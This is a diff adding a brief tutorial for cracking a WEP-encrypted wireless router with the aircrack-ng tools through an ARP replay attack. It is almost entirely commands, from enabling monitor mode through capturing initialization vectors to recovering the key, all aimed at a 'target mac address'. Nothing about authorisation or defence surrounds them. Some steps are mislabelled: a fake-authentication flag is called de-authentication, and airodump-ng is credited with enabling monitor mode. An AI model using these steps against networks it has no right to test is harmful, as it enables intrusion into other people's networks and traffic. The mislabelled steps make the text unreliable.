@@ -1,0 +1,24 @@
+Quick tutorial on how to crack a WEP encrypted router.
+
+This method utilizes the Address Resolution Protocol (ARP) attack.
+
+Required: airmon-ng, airodump-ng, aireplay-ng and aircrack-ng.
+
+
+1. airmon-ng : Confirm Wlan0 exists (Wireless card/driver is compatible.)
+2. airmon-ng start Wlan0 
+3. Kill conflicting PIDs
+
+Use airodump to monitor traffic.
+
+4. airodump-ng mon0 : Activate monitor mode.
+5. airodump-ng -c "channel" -w "output_file_name" --bssid "target mac address" mon0 : Create file-dump for captured traffic.
+
+Now start the ARP attack.
+
+6. aireplay-ng -1 0 -a "target mac address" mon0 : de-authenticating to the router.
+7. aireplay-ng -3 -b "target mac address" mon0 : ARP attack.
+
+When sufficient IVs are collected attempt the aircrack command. Required amount of IVs vary by access point.
+
+8. aircrack-ng "output_file_name.cap"
